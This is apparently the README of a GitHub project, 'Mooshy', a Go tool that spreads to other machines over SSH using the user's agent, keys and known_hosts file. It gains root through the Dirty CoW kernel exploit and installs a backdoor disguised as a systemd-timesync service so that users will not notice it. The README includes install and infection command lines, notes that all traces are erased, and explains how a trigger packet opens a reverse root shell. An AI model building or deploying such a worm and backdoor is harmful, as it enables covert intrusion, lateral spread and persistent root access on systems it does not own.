[![Build Status](https://travis-ci.com/rvolosatovs/mooshy.svg?token=Rr1zHeZEE84zs4P7sgSv&branch=master)](https://travis-ci.com/rvolosatovs/mooshy)

# Mooshy

[![asciicast](https://asciinema.org/a/zK5uZERZHIAw1TsNng2o8eDqX.png)](https://asciinema.org/a/zK5uZERZHIAw1TsNng2o8eDqX)

## Installation:
```sh
    go get -u -v github.com/rvolosatovs/mooshy/cmd/mooshy
```

## Development:
```sh
    make
```

## Generation of the report:
```sh
    make report
```

## Usage:
```sh
    $ mooshy -help                                                       
    Usage of mooshy:
      -addr string
        	The lucky guy
      -moosh string
        	Path to moosh (default "./bin/moosh")
      -ssh
        	Use SSH for the infection
      -sshAgent string
        	Path to SSH agent socket (default "/run/user/1000/gnupg/S.gpg-agent.ssh")
      -sshKey string
        	Path to (passwordless) SSH private key (default "/home/rvolosatovs/.ssh/id_rsa")
      -sshKnown string
        	Path to SSH known_hosts file (default "/home/rvolosatovs/.ssh/known_hosts")
      -sshUser string
        	Username to connect as(e.g. for SSH) (default "averagejoe")
      -useSSHAgent
        	Whether or not use SSH agent
      -useSSHKey
        	Whether or not use (passwordless) SSH private key
      -useSSHKnown
        	Whether or not to try to infect all hosts in SSH known_hosts file
```

# Mechanism of action
The tool operates in 2 modes - infection and execution.

## Infection mode
```sh
   mooshy -ssh -useSSHAgent -sshUser averagejoe -addr 192.168.56.102 # Specific SSH host
   mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser averagejoe # SSH known_hosts
```
- Connects to the victim machine(s) using either of:
    - SSH:
        - Connects to the `addr` specified and/or all hosts in `known_hosts` file, using either a running SSH agent(with `SSH_AUTH_SOCK` set in environment) or using a password-less private key, which provides access to the machine(s).
        - Copies the `moosh` binary to each victim using SFTP.
    - Buffer overflow of a HHTPD server:
        - Connects to the `addr`.
        - Opens reverse shell on the victim machine.
        - Downloads `moosh` binary from somewhere??
        - TODO.
- Executes the `moosh` binary on the victim machine, which:
    - Exploits [Linux kernel vulnerability(CVE-2016-5195)](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) (PoC uses vanilla Ubuntu 16.04 LTS VM) to overwrite a SUID binary(defaults `/usr/bin/passwd`) by shellcode, which sets `/proc/sys/vm/dirty_writeback_centisecs` to `0` and `exec`s `/bin/bash` with `root` privileges(it's a SUID binary owned by `root`). Note, that setting `/proc/sys/vm/dirty_writeback_centisecs` to `0` is required to prevent kernel panic, which would otherwise occur shortly after the execution of exploit due to an invalid state reached, which is triggered by the exploit.
    - Using the "suid root shell" installs the backdoor on the system
    - Creates,enables and starts a `systemd-timesync` systemd service, which launches the backdoor service.
    - Restores the contents of the original binary in it's location and removes all temporary files.

## Execution mode
```sh
   mooshy -addr 192.168.56.102:22 # The port should be any open port
```
- Connects to the infected victim and returns a reverse `root` shell.

# Attack analysis

## Dirty CoW exploit
>  A race condition was found in the way Linux kernel's memory subsystem
>  handled breakage of the read only private mappings COW situation on
>  write access.
>
>  An unprivileged local user could use this flaw to gain
>  write access to otherwise read only memory mappings and thus increase
>  their privileges on the system. ([Source](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#))

## Infection
Once root access is gained through the Dirty CoW exploit, the machine is infected with a persistent backdoor. The binary code for the backdoor is embedded in the `moosh` binary. It creates and enables a new systemd service in `/lib/systemd/system/systemd-timesync.service` and installs the binary as `/lib/sytemd/systemd-timesync`. This name was chosen for its similarity to the existing `systemd-timesyncd` service, to hopefully avoid detection from unsuspecting users. All traces of the exploit are then erased, leaving only the newly installed service. 

## Backdoor
The `systemd-timesync` service creates a raw socket that listens to TCP requests. The raw socket allows the backdoor to listen on all TCP ports with a single socket, while the TCP payload is still handled by the kernel so that normal service by the victim machine is unaffected. When a packet with a specific payload is received, it triggers the backdoor to open a reverse shell to the attacker's machine. The payload consists of a sentinel value, followed by the port number on which the attacker is listening for a reverse shell connection.

The backdoor then opens a new TCP connection to the source IP of the triggering packet, using the specified port. Since the backdoor is run as a systemd service, it has not tty attached. Instead, it uses the `script` executable, which is installed on linux by default, to create a pty and connect it to `/bin/bash`. This opens a fully interactive root shell on the victim's machine, whose input and output are then connected to the opened TCP connection. 
